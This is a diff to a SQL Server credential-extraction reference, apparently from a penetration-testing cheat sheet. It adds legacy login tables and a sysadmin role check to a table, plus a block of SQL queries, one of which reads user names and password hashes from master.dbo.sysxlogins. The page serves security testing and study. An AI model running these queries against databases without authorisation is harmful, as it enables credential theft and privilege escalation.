@@ -16,11 +16,27 @@ Extracting database credentials from Microsoft SQL Server can provide valuable i
 | Information       | Tables/Views                                                      |
 | ----------------- | ----------------------------------------------------------------- |
 | SQL Server Logins | `sys.server_principals`, `sys.sql_logins`, `master.sys.syslogins` |
+| Legacy Tables     | `master..syslogins`, `master..sysprocesses`                       |
+| Columns           | `name`, `loginame`, `password`                                    |
 | SQL Server Roles  | `sys.server_role_members`                                         |
 | Database Users    | `sys.database_principals`                                         |
 | Database Roles    | `sys.database_role_members`                                       |
 | Current User      | `USER_NAME()`, `CURRENT_USER`, `SYSTEM_USER`, `SUSER_NAME()`      |
 | Current Login     | `SUSER_SNAME()`                                                   |
+| Role Check        | `IS_SRVROLEMEMBER('sysadmin')`                                    |
+
+### Legacy Credential Retrieval
+
+```sql
+-- Get current login from process list (legacy)
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+
+-- Check if current user is sysadmin
+SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
+
+-- Retrieve credentials from legacy table (requires privileges)
+SELECT user, password FROM master.dbo.sysxlogins;
+```
 
 ### Examples
 
